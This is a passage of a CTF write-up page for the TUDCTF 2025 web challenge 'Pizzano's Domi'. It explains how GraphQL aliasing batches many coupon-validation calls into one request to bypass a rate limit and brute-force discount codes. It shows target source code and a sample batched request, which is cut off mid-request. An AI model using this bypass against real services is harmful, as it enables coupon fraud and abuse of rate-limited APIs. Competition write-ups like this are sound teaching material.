@@ -1,0 +1,901 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../nothing/">
+      
+      
+        <link rel="next" href="../signs/">
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.20">
+    
+    
+      
+        <title>Pizzano - TUDCTF 2025 Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.eebd395e.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ecc896b0.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../css/particles.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="cyan" data-md-color-accent="pink">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#tudctf-2025-pizzanos-domi-full-writeup-5-solves" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="TUDCTF 2025 Writeups" class="md-header__button md-logo" aria-label="TUDCTF 2025 Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            TUDCTF 2025 Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Pizzano
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="TUDCTF 2025 Writeups" class="md-nav__button md-logo" aria-label="TUDCTF 2025 Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    TUDCTF 2025 Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nothing/" class="md-nav__link">
+        Nothing
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Pizzano
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Pizzano
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#fun-fact-i-always-use-exactly-this-picture-for-embedding-exploits-dont-know-what-you-can-do-with-this-info-maybe-also-use-it-at-some-point-in-life-look-at-him-mister-cool-paul" class="md-nav__link">
+    fun fact: i always use exactly this picture for embedding exploits. don't know what you can do with this info, maybe also use it at some point in life. look at him, mister cool. -Paul
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-introduction" class="md-nav__link">
+    1. Introduction
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-overview-of-the-application-structure" class="md-nav__link">
+    2. Overview of the Application Structure
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-the-frontend-proxy-and-rate-limiting" class="md-nav__link">
+    3. The Frontend Proxy and Rate Limiting
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-backend-coupon-logic" class="md-nav__link">
+    4. Backend Coupon Logic
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-why-brute-force-looks-impossible" class="md-nav__link">
+    5. Why Brute Force Looks Impossible
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-graphql-aliasing-as-a-bypass" class="md-nav__link">
+    6. GraphQL Aliasing as a Bypass
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-sample-batched-request" class="md-nav__link">
+    7. Sample Batched Request
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-full-python-brute-forcer" class="md-nav__link">
+    8. Full Python Brute Forcer
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-final-exploit" class="md-nav__link">
+    9. Final Exploit
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kalikali-curl-x-post-httplocalhost3000graphql-h-content-type-applicationjson-data-exploitjson-dataordersuccesstruemessageorder-placed-successfully-total-23796flagtudctfredacted" class="md-nav__link">
+    ┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://localhost:3000/graphql \
+  -H &quot;Content-Type: application/json&quot; \
+  --data @exploit.json
+
+{&quot;data&quot;:{&quot;order&quot;:{&quot;success&quot;:true,&quot;message&quot;:&quot;Order placed successfully! Total: €237.96&quot;,&quot;flag&quot;:&quot;TUDCTF{redacted}&quot;}}}
+
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-closing-remarks" class="md-nav__link">
+    10. Closing Remarks
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../signs/" class="md-nav__link">
+        Signs
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#fun-fact-i-always-use-exactly-this-picture-for-embedding-exploits-dont-know-what-you-can-do-with-this-info-maybe-also-use-it-at-some-point-in-life-look-at-him-mister-cool-paul" class="md-nav__link">
+    fun fact: i always use exactly this picture for embedding exploits. don't know what you can do with this info, maybe also use it at some point in life. look at him, mister cool. -Paul
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-introduction" class="md-nav__link">
+    1. Introduction
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-overview-of-the-application-structure" class="md-nav__link">
+    2. Overview of the Application Structure
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-the-frontend-proxy-and-rate-limiting" class="md-nav__link">
+    3. The Frontend Proxy and Rate Limiting
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-backend-coupon-logic" class="md-nav__link">
+    4. Backend Coupon Logic
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-why-brute-force-looks-impossible" class="md-nav__link">
+    5. Why Brute Force Looks Impossible
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-graphql-aliasing-as-a-bypass" class="md-nav__link">
+    6. GraphQL Aliasing as a Bypass
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-sample-batched-request" class="md-nav__link">
+    7. Sample Batched Request
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-full-python-brute-forcer" class="md-nav__link">
+    8. Full Python Brute Forcer
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-final-exploit" class="md-nav__link">
+    9. Final Exploit
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kalikali-curl-x-post-httplocalhost3000graphql-h-content-type-applicationjson-data-exploitjson-dataordersuccesstruemessageorder-placed-successfully-total-23796flagtudctfredacted" class="md-nav__link">
+    ┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://localhost:3000/graphql \
+  -H &quot;Content-Type: application/json&quot; \
+  --data @exploit.json
+
+{&quot;data&quot;:{&quot;order&quot;:{&quot;success&quot;:true,&quot;message&quot;:&quot;Order placed successfully! Total: €237.96&quot;,&quot;flag&quot;:&quot;TUDCTF{redacted}&quot;}}}
+
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-closing-remarks" class="md-nav__link">
+    10. Closing Remarks
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="tudctf-2025-pizzanos-domi-full-writeup-5-solves">TUDCTF 2025 Pizzano's Domi - Full Writeup (5 solves)<a class="headerlink" href="#tudctf-2025-pizzanos-domi-full-writeup-5-solves" title="Permanent link">&para;</a></h1>
+<p>web/Pizzano's Domi</p>
+<p><strong>Author</strong>: Paul Stokreef</p>
+<p><strong>Solver</strong>: Teun van der Ploeg</p>
+<p><strong>Platform</strong>: TU Delft CTF 2025</p>
+<p><strong>Category</strong>: web</p>
+<p><strong>Difficulty</strong>: Medium-Hard</p>
+<hr />
+<p><img alt="alt text" src="../image.png" /></p>
+<h6 id="fun-fact-i-always-use-exactly-this-picture-for-embedding-exploits-dont-know-what-you-can-do-with-this-info-maybe-also-use-it-at-some-point-in-life-look-at-him-mister-cool-paul">fun fact: i always use exactly this picture for embedding exploits. don't know what you can do with this info, maybe also use it at some point in life. look at him, mister cool. -Paul<a class="headerlink" href="#fun-fact-i-always-use-exactly-this-picture-for-embedding-exploits-dont-know-what-you-can-do-with-this-info-maybe-also-use-it-at-some-point-in-life-look-at-him-mister-cool-paul" title="Permanent link">&para;</a></h6>
+<h2 id="1-introduction">1. Introduction<a class="headerlink" href="#1-introduction" title="Permanent link">&para;</a></h2>
+<p>This challenge revolves around a pizza ordering site with a GraphQL backend. The idea is simple: ordering a special pizza called <code>FLAG</code> returns the real capture-the-flag token, as long as the total discounted price stays under 500 euros. The price of the flag pizza is 1337 euros by default, so a sufficiently strong coupon is required.</p>
+<p>At first glance, the application rate-limits requests so heavily that brute forcing the coupon space looks impossible. The GraphQL backend contains 200 randomly generated coupons at startup, each five digits long. The code space is 100,000 possibilities. With a rate limit of 20 requests every 30 seconds, guessing the correct coupon appears impossible.</p>
+<p>It turns out there is a path inside the working of GraphQL aliasing: batching multiple operations inside a single HTTP request. That one detail enables a fairly clean exploitation path.</p>
+<p>This writeup explains the full approach, including backend analysis, rate limit bypass, batch exploitation, and the final coupon stacking path to retrieve the flag.</p>
+<hr />
+<h2 id="2-overview-of-the-application-structure">2. Overview of the Application Structure<a class="headerlink" href="#2-overview-of-the-application-structure" title="Permanent link">&para;</a></h2>
+<p>The system consists of:</p>
+<ul>
+<li>
+<p>A Bun-based frontend server acting as a reverse proxy</p>
+</li>
+<li>
+<p>A Rust GraphQL backend implementing the coupon logic</p>
+</li>
+<li>
+<p>Docker configuration passing the flag to the GraphQL binary via environment variables</p>
+</li>
+</ul>
+<p>The frontend rate-limits requests to /graphql. The backend contains the actual vulnerability.</p>
+<hr />
+<h2 id="3-the-frontend-proxy-and-rate-limiting">3. The Frontend Proxy and Rate Limiting<a class="headerlink" href="#3-the-frontend-proxy-and-rate-limiting" title="Permanent link">&para;</a></h2>
+<p>The Bun server proxies /graphql to the Rust service running on port 8000. The key section is:</p>
+<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">RATE_LIMIT_WINDOW_MS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">30</span><span class="nx">_000</span><span class="p">;</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">RATE_LIMIT_MAX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">20</span><span class="p">;</span>
+
+<span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span>
+
+<span class="w">    </span><span class="s2">&quot;/graphql&quot;</span><span class="o">:</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="o">:</span><span class="w"> </span><span class="kt">Request</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="kd">const</span><span class="w"> </span><span class="nx">now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
+
+<span class="w">      </span><span class="nx">timestamps</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">timestamps</span><span class="p">.</span><span class="nx">filter</span><span class="p">((</span><span class="nx">t</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">t</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">now</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">RATE_LIMIT_WINDOW_MS</span><span class="p">);</span>
+
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">timestamps</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">RATE_LIMIT_MAX</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">oldest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">timestamps</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">??</span><span class="w"> </span><span class="nx">now</span><span class="p">;</span>
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">retryAfterMs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">RATE_LIMIT_WINDOW_MS</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">(</span><span class="nx">now</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">oldest</span><span class="p">);</span>
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">retryAfterSec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">ceil</span><span class="p">(</span><span class="nx">retryAfterMs</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">1000</span><span class="p">));</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Response</span><span class="p">(</span><span class="s2">&quot;Too Many Requests&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="nx">status</span><span class="o">:</span><span class="w"> </span><span class="kt">429</span><span class="p">,</span>
+<span class="w">          </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="s2">&quot;Content-Type&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;text/plain&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="s2">&quot;Retry-After&quot;</span><span class="o">:</span><span class="w"> </span><span class="nb">String</span><span class="p">(</span><span class="nx">retryAfterSec</span><span class="p">),</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">        </span><span class="p">});</span>
+<span class="w">      </span><span class="p">}</span>
+
+<span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span>
+</code></pre></div>
+<p>This enforces at most 20 requests in any 30-second window. But this limit applies only to HTTP requests, not to GraphQL operations inside one request. That is the first observation enabling the bypass.</p>
+<hr />
+<h2 id="4-backend-coupon-logic">4. Backend Coupon Logic<a class="headerlink" href="#4-backend-coupon-logic" title="Permanent link">&para;</a></h2>
+<p>The Rust backend generates 200 coupons at startup:</p>
+<div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="n">COUPONS</span><span class="p">:</span><span class="w"> </span><span class="nc">OnceLock</span><span class="o">&lt;</span><span class="n">HashMap</span><span class="o">&lt;</span><span class="nb">String</span><span class="p">,</span><span class="w"> </span><span class="n">CouponType</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OnceLock</span><span class="p">::</span><span class="n">new</span><span class="p">();</span>
+</code></pre></div>
+<p>Each coupon is a 5-digit numeric string. Coupon types include:"</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#[derive(Clone, PartialEq)]</span>
+<span class="k">pub</span><span class="w"> </span><span class="k">enum</span><span class="w"> </span><span class="nc">CouponType</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nb">None</span><span class="p">,</span>
+<span class="w">    </span><span class="n">Percentage</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">discount</span><span class="p">:</span><span class="w"> </span><span class="kt">f64</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="n">NthItem</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">nth</span><span class="p">:</span><span class="w"> </span><span class="kt">usize</span><span class="p">,</span><span class="w"> </span><span class="n">discount</span><span class="p">:</span><span class="w"> </span><span class="kt">f64</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="n">FlatDiscount</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">amount</span><span class="p">:</span><span class="w"> </span><span class="kt">f64</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="n">PizzaSpecific</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">pizza</span><span class="p">:</span><span class="w"> </span><span class="nc">Pizza</span><span class="p">,</span><span class="w"> </span><span class="n">discount</span><span class="p">:</span><span class="w"> </span><span class="kt">f64</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="n">Threshold</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">minimum</span><span class="p">:</span><span class="w"> </span><span class="kt">f64</span><span class="p">,</span><span class="w"> </span><span class="n">discount</span><span class="p">:</span><span class="w"> </span><span class="kt">f64</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="n">StackingDiscount</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">tier1</span><span class="p">:</span><span class="w"> </span><span class="kt">f64</span><span class="p">,</span><span class="w"> </span><span class="n">tier2</span><span class="p">:</span><span class="w"> </span><span class="kt">f64</span><span class="p">,</span><span class="w"> </span><span class="n">tier3</span><span class="p">:</span><span class="w"> </span><span class="kt">f64</span><span class="w"> </span><span class="p">},</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>And a single special 100% discount coupon.</p>
+<p>Internally, the backend applies coupon logic per pizza, then applies flat and threshold coupons at the basket level.
+The important part comes from this detail in the order mutation:</p>
+<div class="highlight"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="n">validation_result</span><span class="p">.</span><span class="n">total_discounted_price</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">500.0</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">Ok</span><span class="p">(</span><span class="n">OrderResult</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">success</span><span class="p">:</span><span class="w"> </span><span class="nc">false</span><span class="p">,</span>
+<span class="w">        </span><span class="n">message</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Order too expensive! Total must be under €500.00&quot;</span><span class="p">.</span><span class="n">to_string</span><span class="p">(),</span>
+<span class="w">        </span><span class="n">flag</span><span class="p">:</span><span class="w"> </span><span class="nb">None</span><span class="p">,</span>
+<span class="w">    </span><span class="p">});</span>
+<span class="p">}</span>
+
+<span class="kd">let</span><span class="w"> </span><span class="n">has_flag_pizza</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="n">pizzas</span><span class="p">.</span><span class="n">iter</span><span class="p">().</span><span class="n">any</span><span class="p">(</span><span class="o">|</span><span class="n">p</span><span class="o">|</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Pizza</span><span class="p">::</span><span class="n">Flag</span><span class="p">);</span>
+
+<span class="kd">let</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">has_flag_pizza</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nb">Some</span><span class="p">(</span><span class="n">std</span><span class="p">::</span><span class="n">env</span><span class="p">::</span><span class="n">var</span><span class="p">(</span><span class="s">&quot;FLAG&quot;</span><span class="p">).</span><span class="n">unwrap_or_else</span><span class="p">(</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="w"> </span><span class="s">&quot;TUDCTF{fake_flag_for_testing}&quot;</span><span class="p">.</span><span class="n">to_string</span><span class="p">()))</span>
+<span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nb">None</span>
+<span class="p">};</span>
+</code></pre></div>
+<p>If the basket total is ≤ 500 and includes the Flag pizza, the challenge flag is returned.</p>
+<hr />
+<h2 id="5-why-brute-force-looks-impossible">5. Why Brute Force Looks Impossible<a class="headerlink" href="#5-why-brute-force-looks-impossible" title="Permanent link">&para;</a></h2>
+<p>The coupon codes are randomly generated five-digit numbers, so the search space is 100k.</p>
+<p>With the enforced rate limit (20 requests per 30 seconds), and each request containing at most a single validateBasket call, brute forcing 100k codes would take nearly seven hours even under ideal conditions.</p>
+<p>Given that the challenge likely expects a faster solution, there must be another avenue.</p>
+<p>The obvious missing element is GraphQL aliasing.</p>
+<hr />
+<h2 id="6-graphql-aliasing-as-a-bypass">6. GraphQL Aliasing as a Bypass<a class="headerlink" href="#6-graphql-aliasing-as-a-bypass" title="Permanent link">&para;</a></h2>
+<p>You are allowed to call the same mutation multiple times inside one GraphQL request using aliases:</p>
+<div class="highlight"><pre><span></span><code><span class="k">mutation</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="nl">a</span><span class="p">:</span><span class="w"> </span><span class="n">validateBasket</span><span class="p">(</span><span class="n">input</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="err">...</span><span class="p">})</span>
+<span class="w">  </span><span class="nl">b</span><span class="p">:</span><span class="w"> </span><span class="n">validateBasket</span><span class="p">(</span><span class="n">input</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="err">...</span><span class="p">})</span>
+<span class="w">  </span><span class="nl">c</span><span class="p">:</span><span class="w"> </span><span class="n">validateBasket</span><span class="p">(</span><span class="n">input</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="err">...</span><span class="p">})</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>The backend processes each one independently, but Bun only sees this as a single HTTP request. So instead of one coupon test per request, we can perform dozens or hundreds at once.</p>
+<p>Each validateBasket allows up to six coupon codes, so a single batched request can test:</p>
+<div class="highlight"><pre><span></span><code>aliases × 6 codes
+</code></pre></div>
+<p>Using around 50 aliases gives 300 coupons checked per request. At 20 requests per window, that becomes roughly 6000 coupons every 30 seconds.</p>
+<p>This immediately reduces the expected brute forcing time for the entire code space from hours to minutes.</p>
+<hr />
+<h2 id="7-sample-batched-request">7. Sample Batched Request<a class="headerlink" href="#7-sample-batched-request" title="Permanent link">&para;</a></h2>
+<p>Here is a minimal example checking 30 coupon codes (00000–00029) using five aliases:</p>
+<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/graphql</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">9cdc02c2ab20.challs.tudc.tf:30155</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+
+<span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;query&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mutation {</span>
+<span class="s2">    b0: validateBasket(input: { pizzas: [], couponCodes: [\&quot;00000\&quot;,\&quot;00001\&quot;,\&quot;00002\&quot;,\&quot;00003\&quot;,\&quot;00004\&quot;,\&quot;00005\&quot;] }) {</span>
+<span class="s2">      appliedCoupons { code description discountType isValid }</span>
+<span class="s2">    }</span>
